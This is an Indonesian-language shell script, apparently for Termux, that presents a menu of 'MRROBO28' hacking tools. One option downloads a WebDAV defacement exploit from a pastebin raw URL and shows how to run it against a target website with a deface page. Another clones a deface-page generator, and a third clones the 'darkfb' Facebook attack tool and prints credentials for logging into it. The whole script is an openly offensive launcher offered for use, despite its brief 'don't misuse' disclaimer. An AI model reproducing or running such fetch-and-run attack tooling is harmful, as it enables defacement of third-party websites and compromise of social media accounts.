clear
sleep 3
toilet -f slant "MRROBO28" | lolcat
toilet -f slant "TOOLS" | lolcat
sleep 1
echo "\033[32;1m---------------------------------------------------------------------------"
sleep 1
echo "\033[0;36mAuthor:""\033[32;1mMR.ROBO.28"
sleep 1
echo "\033[0;36mgithub.com:""\033[32;1mhttps://github.com/MRROBO28"
sleep 1
echo "\033[0;36mInstagram:""\033[32;1m@irshad_faqih"
sleep 1
echo "\033[0;36mNote:""\033[31;1mJangan salah gunakan script ini dengan sembarangan.Karena Admin tidak bertanggung jawab!!!"

echo "\033[32;1m-----------------------------------------------------------------------"
sleep 1
echo "\033[1;33m                           Macam-Macam Tools:"
sleep 1
#menu utama
echo "\033[0;36m[01]""\033[32;1mDeface Webdav"
echo "\033[0;36m[02]""\033[32;1mMembuat script Deface"
echo "\033[0;36m[03]""\033[32;1mDarkfb"
read -p 'Masukkan pilihan Anda :' mrrm;

#Deface webdav

if [ $mrrm = 1 ] || [ $mrrm = 01 ]
then
clear
echo "\033[31;1mSedang download data..."
sleep 3
pip2 install urllib3 chardet certifi idna requests 
apt install openssl curl -y
pkg install libcurl -y
clear
sleep 1
echo "\033[33;1m--++[TUTORIAL]++--"
sleep 1
echo "1.buat file baru di internal dengan nama webdav"
echo "2.taro sc kalian di folder webdav"
read -p 'Sudah Belum??[y/n]' pil0;
#mengulang tools ke menu
if [ $pil0 = n ]
then
echo "mengulang tools"
sleep 3
sh script.sh
fi

if [ $pil0 = y ]
then
echo "OK"
sleep 3
clear
cd /sdcard
cd webdav
curl -k -O https://pastebin.com/raw/HnVyQPtR
mv HnVyQPtR webdav.py
clear
sleep 3
echo "\033[33;1m--++[TUTORIAL WEBDAV]++--"
echo "\033[0;36mEx:""python2 webdav.py [webtarget.com] [sc.html]"
echo "sudah?[y/n]"
read pil
if [ $pil = y ]
then
echo "OK"
sleep 1
echo "silahkan tulis program :)"
$(which bash)
echo "silahkan tulis"
fi
fi

if [ $pil = n ]
then
echo "tools akan di tutup dalam waktu 8 detik..."
sleep 8
exit
fi


fi
#buat script deface
if [ $mrrm = 2 ] || [ $mrrm = 02 ]
then
clear
echo "\033[0;36mMendownload data..."
sleep 2
cd $Home
cd Tools-robo28
git clone https://github.com/4L13199/LITESCRIPT
clear
cd LITESCRIPT
echo "\033[33;1m--++[TUTORIAL]++--"
echo "setelah jadi script deface tuliskan:"
echo "mv [nama script yg sudah jadi] /sdcard"
read -p "sudah??[y/n]" pil2;
fi
if [ $pil2 = n ]
then
echo "program ditutup"
sleep 3
exit
fi
if [ $pil2 = y ]
then
clear
python2 LITESCRIPT.py

fi
#Dark FB
if [ $mrrm = 3 ] || [ $mrrm = 3 ]
then
clear
echo "\033[0;36mMendownload data..."
sleep 2
cd $Home
cd Tools-robo28
git clone https://github.com/storiku/darkfb
clear
cd darkfb
echo "\033[33;1m--++[TUTORIAL]++--"
echo "login ke akun facebook kamu untuk memberikan izin akses script."
echo "Login scriptnya dengan akun:"
echo "ID=Termux"
echo "PW=omaliptv"
read -p "Lanjut??[y/n]" pil3;
fi

if [ $pil3 = y ] 
then
clear
python2 Dark.py
fi
if [ $pil3 = n ]
then
echo "program di tutup..."
sleep 3
exit
fi

